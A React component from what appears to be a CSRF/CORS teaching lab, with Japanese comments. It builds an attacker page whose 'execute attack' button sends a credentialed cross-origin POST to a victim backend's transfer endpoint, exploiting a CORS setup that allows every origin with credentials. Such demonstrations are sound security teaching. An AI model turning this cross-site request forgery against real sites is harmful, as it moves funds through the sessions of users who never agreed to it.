import { useState } from "react";
import { VICTIM_API_BASE, DEFAULT_TARGET, DEFAULT_AMOUNT } from "../config.js";

/**
 * ③ fetch + credentials:'include' によるクロスオリジン JSON POST
 *
 * Content-Type: application/json なので本来は CORS preflight が走るが、
 * victim-backend が CORS_ALLOW_ALL_ORIGINS=True かつ
 * CORS_ALLOW_CREDENTIALS=True で全許可しているため通ってしまう。
 */
export default function FetchTrap() {
  const [output, setOutput] = useState("");
  const [busy, setBusy] = useState(false);

  const run = async () => {
    setBusy(true);
    setOutput("送信中...");
    try {
      const res = await fetch(`${VICTIM_API_BASE}/api/transfer/`, {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ to: DEFAULT_TARGET, amount: DEFAULT_AMOUNT }),
      });
      const text = await res.text();
      setOutput(`HTTP ${res.status}\n${text}`);
    } catch (e) {
      setOutput("エラー: " + e.message);
    } finally {
      setBusy(false);
    }
  };

  return (
    <>
      <pre>{`fetch('${VICTIM_API_BASE}/api/transfer/', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ to: '${DEFAULT_TARGET}', amount: ${DEFAULT_AMOUNT} }),
});`}</pre>

      <button onClick={run} disabled={busy}>
        {busy ? "送信中..." : "攻撃を実行"}
      </button>
      {output && <pre className="result">{output}</pre>}
    </>
  );
}
